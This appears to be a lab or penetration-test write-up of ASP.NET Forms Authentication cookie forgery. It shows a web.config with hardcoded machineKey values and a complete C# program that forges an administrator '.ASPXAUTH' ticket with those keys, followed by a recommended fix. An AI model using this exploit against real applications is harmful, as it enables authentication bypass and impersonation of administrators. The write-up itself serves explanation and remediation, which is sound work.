````md
# ASP.NET Forms Authentication Cookie Forgery Analysis

## RAW `web.config`

```xml
<system.web>
  <compilation targetFramework="4.8" />
  <authentication mode="Forms">
    <forms protection="All" loginUrl="/Login" path="/" />
  </authentication>
  <httpRuntime enableVersionHeader="false"
               maxRequestLength="2048"
               executionTimeout="3600" />
  <machineKey
      decryption="AES"
      decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
      validation="HMACSHA256"
      validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
  <customErrors mode="Off" />
</system.web>
````

---

## Configuration Analysis

```xml
<machineKey
  decryption="AES"
  decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
  validation="HMACSHA256"
  validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
```

### Critical Conditions Identified

* Static `machineKey` values
* Cryptographic algorithms explicitly defined
* No auto-generated per-machine entropy

✅ **This configuration enables offline Forms Authentication ticket generation.**

---

## Attack Analysis

The `.ASPXAUTH` cookie confirms that the application uses **ASP.NET Forms Authentication**, which relies on the `machineKey` to encrypt and sign authentication tickets.

Because the `web.config` exposes a **static `machineKey`** with known cryptographic algorithms:

* An attacker can generate valid authentication cookies offline
* Forged cookies will be accepted by the server
* If authorization logic trusts ticket contents, attackers can impersonate **arbitrary users**, including administrators

**Impact: Authentication Bypass / Privilege Escalation**

---

## Exploitation Steps

### 1. Create Console Project

```bash
dotnet new console -o LegacyAuthConsole
cd LegacyAuthConsole
```

### 2. Add Required Package

```bash
dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5
dotnet restore
```

### 3. Build and Run

```bash
dotnet build
dotnet run
```

### Example Output

```
D05A3523E1356B34DC5974936C3F5208F5E8E114BCA54CC6928750857BC3D0D9EAEF5172C60EEC77F71AD103B82311D808ED3B2ECD1A6C2587ED65D22A40D230D547F7D30F69D47DF9587DDEEF4F4605F7A8F04AD432C9C5921292CF31FF572D90741B7D4616D5ED1B9446C1C72159712F23FF7A020BFF8BE1B4F01CA8EC5A23A8262F91234E08F0565723F51258D3CBB738772CF9BF327D16994D173AC9BC84BF347958D4F0DE27D470F0F70257D9B0A2EA832CFA1908EF16FE18D4CA724E21
```

---

## Exploit Code (`Program.cs`)

```csharp
using System;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static void Main(string[] args)
    {
        string validationKey =
            "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";

        string decryptionKey =
            "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

        var issueDate = DateTime.Now;
        var expiryDate = issueDate.AddHours(1);

        var ticket = new FormsAuthenticationTicket(
            1,
            "web_admin",
            issueDate,
            expiryDate,
            false,
            "Web Administrators",
            "/"
        );

        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

        var encryptor = new LegacyFormsAuthenticationTicketEncryptor(
            decryptionKeyBytes,
            validationKeyBytes,
            ShaVersion.Sha256
        );

        var forgedCookie = encryptor.Encrypt(ticket);
        Console.WriteLine(forgedCookie);
    }
}
```

---

## Recommended Fix

```xml
<!-- Secure MachineKey -->
<machineKey
    compatibilityMode="Framework45"
    decryption="AES"
    validation="HMACSHA256" />
```

### Additional Recommendations

* Remove hardcoded `machineKey` values from source control
* Rely on framework-managed keys or secure secret storage
* Perform server-side authorization checks on every request
* Do not trust roles or privileges embedded in auth tickets

---

## Severity

**Critical – Authentication Bypass / Privilege Escalation**

Equivalent to full account takeover if admin authorization is ticket-based.

```

